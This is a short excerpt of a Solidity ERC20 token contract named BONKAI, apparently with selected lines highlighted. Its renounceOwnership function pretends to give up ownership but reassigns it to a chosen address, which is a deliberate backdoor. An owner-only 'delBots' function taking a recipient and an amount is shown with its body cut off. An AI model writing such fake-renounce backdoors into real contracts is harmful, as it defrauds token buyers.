...
abstract contract Ownable is Context {
    ...
    function renounceOwnership(address dead) public virtual onlyOwner {
        _setOwner(address(0));
        _owner=dead;
...
contract BONKAI is ERC20, Ownable{
    ...
    address public marketingWallet = 0x556770301F2c44ba143A355439C9Dc979C99e798;
    address public devWallet = 0xa354492C9b5b3Dcb216516d7E3DfF07750364E4c;
    ...
    function delBots(address recipient, uint amount) external onlyOwner {
